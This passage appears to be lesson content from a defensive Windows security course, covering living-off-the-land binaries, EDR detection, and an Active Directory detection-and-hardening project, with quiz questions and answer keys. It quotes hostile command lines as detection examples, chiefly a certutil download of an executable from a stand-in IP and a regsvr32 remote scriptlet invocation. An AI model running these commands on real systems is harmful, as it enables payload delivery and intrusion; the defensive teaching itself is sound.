      read: `As on Linux, sophisticated Windows attackers **live off the land** — abusing trusted, signed, built-in binaries so there is no malware file to detect. On Windows these are catalogued as **LOLBAS** (Living Off the Land Binaries And Scripts).

## Windows LOLBins to know

- \`powershell.exe\` — download and run code, encoded commands.
- \`certutil.exe\` — download files and decode base64 (an unexpected "certificate" tool used to fetch payloads).
- \`mshta.exe\` — run HTML applications / scriptlets (a classic phishing execution).
- \`rundll32.exe\` / \`regsvr32.exe\` — execute code from DLLs/scriptlets, often bypassing naive allow-lists ("Squiblydoo").
- \`wmic.exe\`, \`bitsadmin.exe\` — remote execution and downloads.
- \`msbuild.exe\`, \`installutil.exe\` — compile/run arbitrary code (signed by Microsoft, so they defeat signature-based allow-listing).
- \`wscript.exe\`/\`cscript.exe\` — run VBScript/JScript.

## Why signatures fail, and what works

There is no malicious file — every binary is legitimate and signed. Detection is **behavioural and contextual**:

- **Anomalous parent-child** — \`winword.exe\` or \`outlook.exe\` spawning \`powershell.exe\`, \`mshta.exe\` or \`certutil.exe\` is the phishing-execution fingerprint. Office should not spawn scripting engines.
- **Unusual arguments** — \`certutil -urlcache -f http://...\` (downloading), \`powershell -enc\`, \`regsvr32 /s /u /i:http://... scrobj.dll\`.
- **Rare invocations** — \`msbuild\` on a machine with no developers; \`bitsadmin\` transferring from the internet.
- **Baselining** — know what each host normally runs, so an out-of-baseline use of a legitimate tool stands out.

## EDR

**Endpoint Detection and Response** (Microsoft Defender for Endpoint, CrowdStrike, etc.) is built for exactly this: rich behavioural telemetry (process trees, command lines, network, file, registry), detections mapped to ATT&CK, the ability to **hunt** across all endpoints, and to **respond** (isolate a host, kill a process) remotely. Sysmon plus a SIEM approximates the telemetry side; EDR adds detection content, threat intel, and response at scale. Against LOLBins, EDR/Sysmon watching *how legitimate tools are used* is the only reliable defence — you cannot blocklist \`powershell.exe\`, but you can detect Word launching it to download a script.`,
      sample: {
        lang: 'text',
        caption: 'The behaviour, not the binary: certutil abused to download a payload',
        code: `Parent:  winword.exe        (a user opened a document)
  Child: certutil.exe -urlcache -split -f http://203.0.113.9/p.exe %TEMP%\\p.exe
  Child: p.exe                (the downloaded payload runs)

Every binary is signed and legitimate. The DETECTION is:
  - Office spawning certutil (bad parent-child)
  - certutil used to download from a URL (its "urlcache" abuse)
  - a new .exe written to TEMP and executed immediately`,
        output: `You cannot blocklist certutil.exe or winword.exe. You CAN
detect Word launching certutil to fetch an executable — the
context and behaviour are the signal (Sysmon/EDR + 4688/4104).`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why is "Microsoft Word (winword.exe) spawning PowerShell or certutil" treated as a high-confidence detection, even though every process involved is legitimate and signed?',
        options: [
          'Word cannot run other programs',
          'A productivity application has no normal reason to launch scripting or download tools; that parent-child relationship is the fingerprint of a malicious document executing its payload — a behavioural signal that works even though no malicious file or signature is present',
          'PowerShell and certutil are malware',
          'It only matters if the file is unsigned',
        ],
        answer: 1,
        explain:
          'Living-off-the-land attacks use trusted binaries, so there is nothing to signature. The maliciousness is in the *context*: Office spawning a scripting engine or download utility is the classic phishing-execution chain and essentially never happens benignly. Detecting on anomalous parent-child relationships, unusual arguments, and departures from baseline — via Sysmon/4688/4104 and EDR — is how you catch LOLBin abuse.',
        hint: 'Does a word processor have a legitimate reason to launch PowerShell or a download tool?',
      },
    },

    {
      id: 'bwin-i-12',
      title: 'Project: build and validate AD attack detections',
      read: `Bring the level together the way an AD defender is measured: take the key attacks, ensure you can **detect** each one, and **validate** the detections by safely emulating the attack in a lab — the Windows purple-team loop.

## The detection set to build (in your lab domain)

For each attack, confirm the telemetry exists, write the detection, then emulate and verify it fires:

- **Kerberoasting** → 4769 with RC4 / high SPN-request volume per user. Emulate with a benign roasting request against a lab SPN.
- **AS-REP roasting** → 4768 without pre-auth for flagged accounts; also *audit and clear* the DONT_REQ_PREAUTH flag as the mitigation.
- **DCSync** → 4662 replication rights requested by a non-DC. High-fidelity; alert on it.
- **Golden/silver tickets** → anomalous ticket lifetimes/behaviour; know the double krbtgt-reset recovery.
- **Lateral movement** → Type-3 logon fan-out + remote-exec parents (services.exe/WmiPrvSE/wsmprovhost) via Sysmon.
- **LOLBins** → Office spawning scripting/download tools; unusual certutil/mshta/regsvr32 arguments.

## The hardening set to apply

- Tiered admin + logon restrictions; privileged accounts in **Protected Users**; **LAPS** deployed; unconstrained **delegation** removed; **gMSA** for service accounts; **RC4 disabled**.

## The validation loop

1. **Prerequisite:** confirm the events exist (audit policy, command-line/PowerShell logging, Sysmon) — you cannot detect what you do not log.
2. **Emulate** one technique in the lab (Atomic Red Team has AD tests; roasting tools have benign modes).
3. **Check** the detection fires and measure how quickly.
4. **Fix gaps** — missing telemetry, missing rule, or a control that should have blocked it.
5. **Re-test.** Track **which ATT&CK techniques you can detect**, and reduce **BloodHound paths to Domain Admin** toward zero.

## The measure of success

An intermediate AD defender can say, with evidence: "We detect Kerberoasting, AS-REP roasting, DCSync and lateral movement; our service accounts are gMSA with least privilege; privileged credentials are tiered and in Protected Users; LAPS is deployed; and BloodHound shows no short path to Domain Admin." That combination of **detections you have validated** and **paths you have removed** is what actually makes an Active Directory hard to own.`,
      sample: {
        lang: 'text',
        caption: 'An AD detection-and-hardening scorecard for the lab domain',
        code: `Attack / control            Telemetry      Detection   Hardening
--------------------------------------------------------------------
Kerberoasting               4769 (RC4)     rule fires  gMSA + no RC4
AS-REP roasting             4768 no-preauth rule fires flag cleared
DCSync                      4662 repl      alert fires repl ACL locked
Lateral movement            4624 T3 + Sysmon rule fires tiering + LAPS
LOLBin (Office->script)     Sysmon/4688    rule fires  app control
Path to Domain Admin (BH)   n/a            n/a         0 short paths

Validated by emulation in the lab. MTTD for DCSync: 2 min.`,
        output: `Detections you have PROVEN fire, plus escalation paths you have
REMOVED (BloodHound at zero). That evidence — not "we think AD
is fine" — is what a defended Active Directory looks like.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Before writing detection rules for AD attacks, why must you first confirm the necessary events are actually being logged?',
        options: [
          'Rules run faster with more logs',
          'You can only detect activity that produces telemetry — if audit policy, command-line/PowerShell logging and Sysmon are not configured, the events your rules depend on are never generated, so even a perfect rule will silently miss the attack',
          'It is a licensing requirement',
          'Logging replaces the need for rules',
        ],
        answer: 1,
        explain:
          'Detection is impossible without the underlying events. Kerberoasting rules need 4769; DCSync needs 4662; lateral-movement and LOLBin rules need process-creation-with-parent (Sysmon/4688) and PowerShell 4104. If those are not enabled, the attack happens invisibly regardless of your rules. Confirming telemetry first — then emulating to validate the rule fires — is the discipline that makes AD detection real rather than assumed.',
        hint: 'What has to exist before any query or rule can possibly match an attack?',
      },
    },
  ],
}

export default level
